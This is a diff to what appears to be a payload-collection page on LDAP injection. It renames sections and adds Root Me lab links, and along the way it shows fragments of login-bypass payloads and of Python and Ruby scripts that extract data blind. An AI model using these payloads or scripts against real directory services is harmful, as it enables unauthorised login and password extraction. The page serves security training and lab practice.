@@ -2,9 +2,10 @@
 
 > LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
 
+
 ## Summary
 
-* [Exploitation](#exploitation)
+* [Methodology](#methodology)
 * [Payloads](#payloads)
 * [Blind Exploitation](#blind-exploitation)
 * [Defaults attributes](#defaults-attributes)
@@ -12,8 +13,11 @@
 * [Scripts](#scripts)
   * [Discover valid LDAP fields](#discover-valid-ldap-fields)
   * [Special blind LDAP injection](#special-blind-ldap-injection)
+* [Labs](#labs)
+* [References](#references)
 
-## Exploitation
+
+## Methodology
 
 Example 1.
 
@@ -78,6 +82,7 @@ We can extract using a bypass login
 (&(sn=administrator)(password=MYKE)) : OK
 ```
 
+
 ## Defaults attributes
 
 Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
@@ -93,6 +98,7 @@ mail
 givenName
 commonName
 ```
+
 
 ## Exploiting userPassword attribute
 
@@ -113,15 +119,12 @@ userPassword:2.5.13.18:=\xx\xx\xx
 
 ```python
 #!/usr/bin/python3
-
 import requests
 import string
 
 fields = []
-
 url = 'https://URL.com/'
-
-f = open('dic', 'r') #Open the worldists of common attributes
+f = open('dic', 'r')
 world = f.read().split('\n')
 f.close()
 
@@ -137,7 +140,6 @@ print(fields)
 
 ```python
 #!/usr/bin/python3
-
 import requests, string
 alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 
@@ -152,15 +154,14 @@ for i in range(50):
             break
 ```
 
+Exploitation script by [@noraj](https://github.com/noraj)
 
 ```ruby
 #!/usr/bin/env ruby
-
 require 'net/http'
 alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
 
 flag = ''
-
 (0..50).each do |i|
   puts("[i] Looking for number #{i}")
   alphabet.each do |char|
@@ -174,7 +175,12 @@ flag = ''
 end
 ```
 
-By [noraj](https://github.com/noraj)
+
+
+## Labs
+
+* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
+* [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)
 
 
 ## References
